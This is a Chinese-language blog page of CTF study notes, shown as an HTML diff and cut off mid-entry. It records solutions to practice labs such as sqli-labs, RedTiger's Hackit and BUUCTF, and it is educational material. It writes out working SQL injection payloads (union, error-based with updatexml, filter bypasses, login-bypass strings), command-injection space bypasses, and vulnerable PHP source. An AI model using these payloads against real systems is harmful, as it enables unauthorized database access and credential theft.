@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>CTF知识点 | blog小窝</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="# 1. [HCTF 2018]WarmUp PHP 代码审计 在地址栏读取 php 文件  php 学习  warmserver 下载安装使用 在多个文件夹下打开 flag">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF知识点">
+<meta property="og:url" content="https://my011215.github.io/2022/08/16/CTF/CTF%E7%9F%A5%E8%AF%86%E7%82%B9/index.html">
+<meta property="og:site_name" content="blog小窝">
+<meta property="og:description" content="# 1. [HCTF 2018]WarmUp PHP 代码审计 在地址栏读取 php 文件  php 学习  warmserver 下载安装使用 在多个文件夹下打开 flag">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-16T13:16:30.000Z">
+<meta property="article:modified_time" content="2022-10-31T06:54:44.118Z">
+<meta property="article:author" content="草莓布丁">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="blog小窝" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">blog小窝</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/categories/%E5%AD%A6%E4%B9%A0%E5%88%86%E4%BA%AB/">学习分享</a>
+        
+          <a class="main-nav-link" href="/categories/web%E5%AE%89%E5%85%A8/">安全</a>
+        
+          <a class="main-nav-link" href="/categories/%E5%85%B4%E8%B6%A3/">兴趣</a>
+        
+          <a class="main-nav-link" href="/richang">日常</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://my011215.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-CTF/CTF知识点" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/08/16/CTF/CTF%E7%9F%A5%E8%AF%86%E7%82%B9/" class="article-date">
+  <time datetime="2022-08-16T13:16:30.000Z" itemprop="datePublished">2022-08-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>►<a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CTF知识点
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2><span id="1-hctf-2018warmup"> 1. [HCTF 2018]WarmUp</span></h2>
+<p>PHP 代码审计<br>
+在地址栏读取 php 文件<br>
+ php 学习<br>
+ warmserver 下载安装使用<br>
+在多个文件夹下打开 flag</p>
+<span id="more"></span>  
+<h2><span id="2-极客大挑战-2019-havefun"> 2. [极客大挑战 2019] Havefun</span></h2>
+<p>php 中 get 请求知识点</p>
+<h2><span id="3-极客大挑战-2019-php"> 3. [极客大挑战 2019] PHP</span></h2>
+<p>下载爆破工具 dirsearch 解压，再用一系列命令安装 python3 以上版本，pip,pip3,pip3 版本升级，解决代理权限问题，找到一系列文件之后，因为是备份<br>
+常用的备份文件名和文件后缀，利用这俩信息通过 python 代码在网址中遍历找到对应的压缩包<br>
+下载压缩包打开，index.php— 根据提示打开 class.php<br>
+ 读取 class.php 代码，找到关键信息，之后序列化，再反序列化，解决魔方函数问题，最后找出 flag</p>
+<h2><span id="4-gxyctf2019ping-ping-ping"> 4. [GXYCTF2019]Ping Ping Ping</span></h2>
+<p>ip 地址知识<br>
+ dos 命令<br>
+ ls - 列出目录内容<br>
+ cat 命令用于连接文件并打印到标准输出设备上。<br>
+php 代码解读<br>
+绕过空格办法<br>
+ cat flag.txt<br>
+cat<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>I</mi><mi>F</mi><mi>S</mi></mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mi>c</mi><mi>a</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">{IFS}flag.txt  
+cat</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span></span></span></span>IFS$9flag.txt<br>
+cat&lt;flag.txt<br>
+cat&lt;&gt;flag.txt<br>
+ 变量拼接小技巧<br>
+正则表达式</p>
+<h2><span id="5-极客大挑战-2019-easysql1"> 5. [极客大挑战 2019] EasySQL1</span></h2>
+<p>登录 SQL 语句：select * from admin where username = ‘用户输入的用户名‘ and password =‘用户输入的密码’<br>
+用户输入的内容可由用户自行控制，例如可以输入 ‘or 1 = 1 -- 空格<br>
+ SQL 语句：select * from admin where username =’’ or 1=1 --'and password =‘用户输入的密码’<br>
+其中 or 1=1 永远为真，–注释后面内容不再执行，因此 SQL 语句执行会返回 admin 表中的所有内容<br>
+抓包找出万能密码  (找出具体是哪种后台语言，确定万能密码)</p>
+<h2><span id="6-极客大挑战-2019-hardsql"> 6. [极客大挑战 2019] HardSQL</span></h2>
+<p 4fddef99-590c-45da-bfef-90828a1dc70e>报错注入<br>
+ 1’or (updatexml (1,concat (0x7e,database (),0x7e),1)) or’<br>
+数据库：geek<br>
+1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or’<br>
+表：H4rDsq1<br>
+1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))or’<br>
+列：id,username,password<br>
+1’or(updatexml(1,concat(0x7e,(select(group_concat(right(password,100)))from(geek.H4rDsq1)),0x7e),1))or’<br>
+flag</p>
+<p>9-590c-45da-bfef-90828a1dc70e}</p>
+<h2><span id="7-buu-sql-course-1"> 7. BUU SQL COURSE 1</span></h2>
+<p>火狐 f12 测试，找到可疑文件，进入 http://a27afc80-fc2d-45b7-bcea-90d52c0850be.node4.buuoj.cn:81/backend/content_detail.php?id=1<br>
+ 判断：and 1 = 1;and 1 = 2;1’<br>
+测字段数：1 order by 2<br>
+ 显位：id = 0 union select 1,2  都可以显示<br>
+爆库：<br>
+id=0 union select 1,group_concat(schema_name) from (information_schema.schemata)<br>
+information_schema,ctftraining,mysql,performance_schema,test,news<br>
+id=0 union select 1,database()<br>
+news<br>
+ 爆表：<br>
+id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()<br>
+admin,contents<br>
+ 爆列：<br>
+id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘admin’<br>
+id,username,password<br>
+ 爆值：<br>
+0 union select 1,group_concat(id,username,password) from (admin)<br>
+1   admin  4a581b825861c72e390fa6fbc1aa2063</p>
+<h2><span id="8-第一章-web-入门-sql-注入-1"> 8. [第一章 web 入门] SQL 注入 - 1</span></h2>
+<p union_select_is_so_cool>判断<br>
+ and 1 = 1; and 1 = 2; 不报错  字符型<br>
+ #不行，–+ 可以<br>
+测字段数<br>
+ id=1’ order by 3 --+<br>
+id=1’ order by 4 --+<br>
+ 显位：<br>
+id=0’ union select 1,2,3–+<br>
+2,3 显位<br>
+爆库：<br>
+id=0’ union select 1,2,database()–+<br>
+note<br>
+id=0’ union select 1,2,group_concat(schema_name) from (information_schema.schemata)–+<br>
+information_schema,mysql,note,performance_schema<br>
+ 爆表：<br>
+id=0’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+<br>
+fl4g,notes<br>
+ 爆列：<br>
+id=0’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘fl4g’–+<br>
+fllllag<br>
+id=0’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘notes’<br>
+id,title,content<br>
+ 爆值：<br>
+0’ union select 1,2,group_concat(fllllag) from (fl4g)<br>
+n1book</p>
+<h2><span id="9-第一章-web-入门-sql-注入-2"> 9. 第一章 web 入门] SQL 注入 - 2</span></h2>
+<p login_sqli_is_nice>根据提示进入 login.php<br>
+ 查看源代码得到提示输入？tips=1 后会得到报错提示<br>
+但是发现联合注入貌似不太行，于是尝试报错注入，利用 burp 抓包<br>
+爆库：<br>
+1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) #<br>
+1’ and extractvalue(1,concat(0x7e,database(),0x7e)) #<br>
+note<br>
+ 爆表：<br>
+1’ and updatexml(1,concat(0x7e,(seselectlect group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #<br>
+对 select 进行绕过<br>
+ fl4g,users<br>
+ 爆列：<br>
+1’ and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_schema=database()),0x7e),1) #<br>
+flag,id,username,passwd<br>
+1’ and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name=‘fl4g’),0x7e),1) #<br>
+flag<br>
+1’ and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) from information_schema.columns where table_name=‘users’),0x7e),1) #<br>
+id,username,passwd<br>
+ 爆值：<br>
+1’ and updatexml(1,concat(0x7e,(seselectlect group_concat(flag<br>
+) from (fl4g<br>
+)),0x7e),1) #<br>
+n1book</p>
+<h2><span id="10-redtigers-hackit-level1"> 10. RedTiger’s Hackit Level1</span></h2>
+<p>Level1   Simple SQL-Injection<br>
+ 查看源代码发现 cat=1 点击进入<br>
+发现注入点<br>
+判断:<br>
+and 1 = 1;and 1 = 2;1’;<br>
+ 数字型注入<br>
+测字段数：<br>
+?cat=1 order by 4–+<br>
+?cat=1 order by 5–+<br>
+ 字段数为 4<br>
+ 显位：<br>
+?cat=1 union select 1,2,3,4–+<br>
+ 成功把 3，4 显示出来<br>
+爆库：<br>
+?cat=1 union select 1,2,3,database()–+<br>
+hackit<br>
+ 爆表：<br>
+?cat=1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()–+<br>
+ 发现不能显示<br>
+题目提示 level1_users<br>
+ 爆列：<br>
+?cat=1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘level1_users’–+<br>
+ 没啥结果，不如问题简单化<br>
+一般有 username,password<br>
+ 爆值：<br>
+?cat=1 union select 1,2,username,password from level1_users–+<br>
+Hornoxe<br>
+thatwaseasy</p>
+<h2><span id="11-redtigers-hackit-level2"> 11. RedTiger’s Hackit Level2</span></h2>
+<p>万能密码<br>
+ 1’ or 1 = 1<br>
+1’ or 1 = 1</p>
+<h2><span id="12-redtigers-hackit-level3"> 12. RedTiger’s Hackit Level3</span></h2>
+<h2><span id="13-sqli-labs-masterless-1"> 13. sqli-labs-master/Less-1</span></h2>
+<p>字符型联合、报错、布尔、时间</p>
+<ol>
+<li>判断<br>
+？id=1 and 1 = 1–+<br>
+?id=1 and 1 = 2–+<br>
+?id=1’ and 1 = 1–+<br>
+?id=1’ and 1 = 2–+<br>
+ 字符型</li>
+<li>判断字段数<br>
+？id=1’ order by 3–+<br>
+?id=1’ order by 4–+<br>
+ 字段数为 3</li>
+<li>显位<br>
+？id=0’ union select 1,2,3–+<br>
+ 成功显示 2，3</li>
+<li>爆库<br>
+ 0’ union select 1,2,group_concat (schema_name) from (information_schema.schemata)–+</li>
+<li>爆表<br>
+ 0’ union select 1,2,group_concat (table_name) from information_schema.tables where table_schema=database ()–+</li>
+<li>爆字段</li>
+<li>爆值</li>
+</ol>
+<h2><span id="14-sqli-labs-masterless-2"> 14. sqli-labs-master/Less-2</span></h2>
+<p>数字型联合、报错、布尔、时间</p>
+<ol>
+<li>
+<p>判断<br>
+ 1 和 1‘，数字型</p>
+</li>
+<li>
+<p>判断字段数<br>
+ id=1 order by 3–+<br>
+id=1 order by 4–+<br>
+ 字段数为 3</p>
+</li>
+<li>
+<p>显位<br>
+ id=0 union select 1,2,3–+<br>
+2,3 位置成功显示出来<br>
+说明既是 union 联合注入又存在 2，3 显示位</p>
+</li>
+<li>
+<p>爆库<br>
+ id=0 union select 1,2,group_concat (schema_name) from (information_schema.schemata)–+<br>
+ 所有数据库：information_schema,challenges,mysql,performance_schema,pikachu,security,sys<br>
+id=0 union select 1,2,database()–+<br>
+ 当前数据库：security</p>
+</li>
+<li>
+<p>爆表<br>
+ id=0 union select 1,2,group_concat (table_name) from information_schema.tables where table_schema=database ()–+<br>
+security 数据库：emails,referers,uagents,users</p>
+</li>
+<li>
+<p>爆列<br>
+ id=0 union select 1,2,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘users’–+<br>
+security 数据库 users 表：id,username,password</p>
+</li>
+<li>
+<p>爆值<br>
+ id=0 union select 1,2,group_concat (concat_ws (username,password)) from (users)–+<br>
+security 数据库 users 表 username,password 列：Angelina，I-kill-you</p>
+</li>
+<li>
+<p>代码</p>
+</li>
+</ol>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123; 	</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2><span id="15-sqli-labs-masterless-3"> 15. sqli-labs-master/Less-3</span></h2>
+<p>字符型联合、报错、布尔、时间</p>
+<ol>
+<li>
+<p>判断<br>
+ id=1’)–+<br>
+xx 型注入</p>
+</li>
+<li>
+<p>判断字段数<br>
+ id=1’) order by 3–+<br>
+id=1’) order by 4–+<br>
+ 字段数为 3</p>
+</li>
+<li>
+<p>显位<br>
+ id=0’) union select 1,2,3–+<br>
+2,3 成功回显</p>
+</li>
+<li>
+<p>爆库<br>
+ id=0’) union select 1,2,group_concat (schema_name) from (information_schema.schemata)–+<br>
+ 所有数据库：information_schema,challenges,mysql,performance_schema,pikachu,security,sys<br>
+id=0’) union select 1,2,database()–+<br>
+ 当前数据库：security</p>
+</li>
+<li>
+<p>爆表<br>
+ id=0’) union select 1,2,group_concat (table_name) from information_schema.tables where table_schema=database ()–+<br>
+security 数据库：emails,referers,uagents,users</p>
+</li>
+<li>
+<p>爆列<br>
+ id=0’) union select 1,2,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘users’–+<br>
+security 数据库 users 表：id,username,password</p>
+</li>
+<li>
+<p>爆值<br>
+ id=0’) union select 1,2,group_concat (concat_ws (username,password)) from (users)–+<br>
+security 数据库 users 表 username,password 列：Angelina，I-kill-you</p>
+</li>
+<li>
+<p>代码</p>
+</li>
+</ol>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<h2><span id="16-sqli-labs-masterless-4"> 16. sqli-labs-master/Less-4</span></h2>
+<p>字符型联合、报错、布尔、时间</p>
+<ol>
+<li>
+<p>判断<br>
+ id=1&quot;)–+<br>
+ 双引号型注入</p>
+</li>
+<li>
+<p>判断字段数<br>
+ id=1&quot;) order by 3–+<br>
+id=1&quot;) order by 4–+<br>
+ 字段数为 3</p>
+</li>
+<li>
+<p>显位<br>
+ id=0&quot;) union select 1,2,3–+<br>
+2,3 成功回显</p>
+</li>
+<li>
+<p>爆库<br>
+ id=0&quot;) union select 1,2,group_concat (schema_name) from (information_schema.schemata)–+<br>
+ 所有数据库：information_schema,challenges,mysql,performance_schema,pikachu,security,sys<br>
+id=0&quot;) union select 1,2,database()–+<br>
+ 当前数据库：security</p>
+</li>
+<li>
+<p>爆表<br>
+ id=0&quot;) union select 1,2,group_concat (table_name) from information_schema.tables where table_schema=database ()–+<br>
+security 数据库：emails,referers,uagents,users</p>
+</li>
+<li>
+<p>爆列<br>
+ id=0&quot;) union select 1,2,group_concat (column_name) from information_schema.columns where table_schema=database () and table_name=‘users’–+<br>
+security 数据库 users 表：id,username,password</p>
+</li>
+<li>
+<p>爆值<br>
+ id=0&quot;) union select 1,2,group_concat (concat_ws (username,password)) from (users)–+<br>
+security 数据库 users 表 username,password 列：Angelina，I-kill-you</p>
+</li>
+<li>
+<p>代码</p>
+</li>
+</ol>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<h2><span id="17-sqli-labs-masterless-5"> 17. sqli-labs-master/Less-5</span></h2>
+<p>字符型报错、布尔、时间（’,%’）</p>
+<ol>
+<li>判断<br>
+一系列测试貌似没有啥结果，报错注入成功，用 sqlmap 探测一下发现有报错注入、布尔盲注、时间盲注</li>
+<li>爆库 (以报错注入讲解)<br>
+1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+<br>
+1’ and extractvalue(1,concat(0x7e,database(),0x7e))–+<br>
+ 当前数据库：security</li>
+<li>爆表<br>
+ 1’ and updatexml (1,concat (0x7e,(select group_concat (table_name) from information_schema.tables where table_schema=database ()),0x7e),1)–+<br>
+security 数据库：emails,referers,uagents,users</li>
+<li>爆列<br>
+ 1’ and updatexml (1,concat (0x7e,(select group_concat (column_name) from information_schema.columns where table_schema=database ()),0x7e),1)–+<br>
+security 数据库：id,email_id,id,referer,ip_addre</li>
+</ol>
+<p>1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=‘users’),0x7e),1)–+<br>
+USER,CURRENT_CONNECTIONS,TOTAL<br>
+ 没完全爆出来，建议使用盲注，left（）,right () 函数在这里貌似不行<br>
+ 1’ and updatexml (1,concat (0x7e,(select column_name from information_schema.columns where table_name=‘表名’ limit 0,1),0x7e),1) --+<br>
+ 不断更改 limit () 取值范围即可<br>
+发现有 username,password<br>
+5. 爆值<br>
+ 1’ and updatexml (1,concat (0x7e,(select group_concat (username,password) from (security.users)),0x7e),1)–+<br>
+DumbDumb,AngelinaI-kill-you,Dum<br>
+ 同理不断更改 limit () 就可得到全部内容</p>
+<ol start="6">
+<li>代码</li>
+</ol>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>mysql_error () 函数返回上一个 MySQL 操作产生的文本错误信息</p>
+<h2><span id="18-sqli-labs-masterless-6"> 18. sqli-labs-master/Less-6</span></h2>
+<p>字符型报错、布尔、时间（&quot;,’&quot;）</p>
+<ol>
+<li>
+<p>判断<br>
+一系列测试貌似没有啥结果，报错注入成功，用 sqlmap 探测一下发现有报错注入、布尔盲注、时间盲注<br>
+稍微有点区别，之前报错注入和盲注都是单引号，这里是双引号</p>
+</li>
+<li>
+<p>爆库 (以报错注入讲解)<br>
